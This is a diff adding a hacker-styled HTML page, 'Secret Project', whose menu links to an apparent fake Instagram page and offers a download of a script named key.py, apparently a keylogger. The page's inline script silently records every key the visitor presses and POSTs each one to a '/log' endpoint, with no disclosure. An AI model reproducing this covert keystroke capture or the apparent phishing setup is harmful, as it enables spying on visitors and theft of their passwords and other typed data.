@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secret Project</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=VT323&display=swap');
+
+        body {
+            background-color: #000;
+            color: #0f0;
+            font-family: 'VT323', monospace;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .container {
+            display: flex;
+            justify-content: space-around;
+            width: 100%;
+            max-width: 800px;
+            position: relative;
+        }
+
+        .option {
+            background-color: #111;
+            border: 2px solid #0f0;
+            border-radius: 5px;
+            padding: 20px;
+            width: 30%;
+            font-size: 20px;
+            cursor: pointer;
+            opacity: 0;
+            color: #0f0;
+            transition: opacity 0.3s ease, background-color 0.3s ease, transform 0.3s ease;
+            text-transform: uppercase;
+            text-shadow: 0 0 5px #0f0;
+        }
+
+        .option:hover {
+            opacity: 1;
+            background-color: #333;
+            transform: scale(1.1);
+        }
+
+        .container::before {
+            content: 'What do you want to do?';
+            font-size: 24px;
+            position: absolute;
+            top: -50px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #0f0;
+            text-shadow: 0 0 10px #0f0;
+        }
+
+        .social-links {
+            position: absolute;
+            bottom: 10px;
+            right: 10px;
+        }
+
+        .social-links a {
+            color: #0f0;
+            font-size: 24px;
+            margin: 0 10px;
+            text-decoration: none;
+            transition: color 0.3s ease;
+        }
+
+        .social-links a:hover {
+            color: #007BFF;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+            <a href="insta.html" class="option">FAKE IG</a>
+            <a href="key.py" download class="option">PY SCRIPT</a>
+            <button class="option" onclick="location.href='https://www.google.com'">Exit</button>
+    </div>
+
+    <div class="social-links">
+        <a href="https://github.com/Lavyakumar" target="_blank" title="GitHub">
+            <i class="fab fa-github"></i>
+        </a>
+        <a href="https://www.instagram.com/lavyakumar_07/" target="_blank" title="Instagram">
+            <i class="fab fa-instagram"></i>
+        </a>
+    </div>
+
+<script>
+ document.addEventListener('keydown', function(event) {
+            let key = event.key;
+            fetch('/log', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ key: key })
+            });
+        });
+    </script>
+</body>
+</html>
